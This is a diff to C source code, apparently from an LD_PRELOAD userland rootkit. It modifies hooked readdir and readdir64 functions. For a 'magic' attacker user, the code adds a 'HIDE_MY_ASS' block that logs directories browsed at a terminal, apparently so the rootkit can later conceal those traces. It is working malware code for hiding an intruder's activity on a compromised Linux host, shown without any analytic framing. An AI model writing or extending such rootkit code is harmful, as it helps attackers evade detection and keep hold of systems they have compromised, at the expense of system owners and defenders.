@@ -6,7 +6,19 @@ struct dirent *readdir(DIR *dirp){
     hook(CREADDIR);
 
     while((dir = call(CREADDIR, dirp)) != NULL){
-        if(magicusr()) return dir;
+        if(magicusr()){
+#ifdef HIDE_MY_ASS
+            int outfd = fileno(stdout);
+            if(!outfd) return dir;
+            if(isatty(outfd)){
+                char *apath = gdirname(dirfd(dirp));
+                if(!pathtracked(apath))
+                    trackwrite(apath);
+                free(apath);
+            }
+#endif
+            return dir;
+        }
 
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
@@ -41,7 +53,19 @@ struct dirent64 *readdir64(DIR *dirp){
     hook(CREADDIR64);
 
     while((dir = call(CREADDIR64, dirp)) != NULL){
-        if(magicusr()) return dir;
+        if(magicusr()){
+#ifdef HIDE_MY_ASS
+            int outfd = fileno(stdout);
+            if(!outfd) return dir;
+            if(isatty(outfd)){
+                char *apath = gdirname(dirfd(dirp));
+                if(!pathtracked(apath))
+                    trackwrite(apath);
+                free(apath);
+            }
+#endif
+            return dir;
+        }
 
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
